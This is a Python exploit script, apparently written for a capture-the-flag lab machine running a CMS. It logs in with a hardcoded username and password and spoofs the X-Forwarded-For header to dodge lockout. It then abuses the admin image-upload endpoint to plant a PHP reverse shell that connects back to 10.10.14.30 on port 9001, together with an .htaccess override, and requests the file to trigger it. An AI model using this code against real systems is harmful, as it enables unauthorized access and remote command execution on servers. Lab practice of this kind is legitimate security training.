#!/usr/bin/env python3

import requests
import re
import string
import random
import sys

session = requests.Session()
url = 'http://10.10.10.191'
#proxie = {'http':'127.0.0.1:8080'}
payload_php = '<?php exec("bash -c \'bash -i >& /dev/tcp/10.10.14.30/9001 0>&1\'"); ?>'
payload_name = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(10)) + '.php'
htaccess = 'RewriteEngine on\nRewriteRule ^.*$ -'

def get_token(target):
	req = session.get(target)
	csrf_token = re.search(r'tokenCSRF" value="(.*?)"', str(req.text)).group(1)
	return csrf_token

def login(username, password, login_url):
	token_csrf = get_token(login_url)
	headers = {
		'X-Forwarded-For': f"{random.randint(1,500)}"}
	data = {
		'tokenCSRF':token_csrf,
		'username':username,
		'password':password,
		'save':''
			}
	response = session.post(login_url, data=data, headers=headers, allow_redirects=False)
	try:
		if '/admin/dashboard' in response.headers['Location']:
				print(f'[*] Successfully logged in as: {username}:{password}')
	except KeyError:	
		print(f'[*] Attempting to logged in as: {username}:{password}')

def upload_image(payload, payload_name, target, admin_csrf):
	csrf_token = get_token(admin_csrf)
	files = {
		'images[]':(payload_name, payload),
		'uuid':(None, ''),
		'tokenCSRF':(None, csrf_token)
			}
	res = session.post(target, files=files)
	if res.status_code == 200:
			print('[*] Successfully upload the payload: {p}'.format(p=payload_name))
	else:
			return False

def exe_shell(shell_location):
	print(f'[*] Connecting to the shell: {payload_name}')
	response = session.get(shell_location)	
	print(response.text)

def main():
	login_url = url + '/admin/login'
	admin_csrf_token = url + '/admin/new-content'
	upload_url = url + '/admin/ajax/upload-images'
	shell_url = url + '/bl-content/tmp/' + payload_name

	login('fergus', 'RolandDeschain', login_url=login_url)

	upload_image(payload=payload_php, payload_name=payload_name, target=upload_url, admin_csrf=admin_csrf_token)
	upload_image(payload=htaccess, payload_name='.htaccess', target=upload_url, admin_csrf=admin_csrf_token)
	exe_shell(shell_url)
if __name__ == '__main__':
	main()
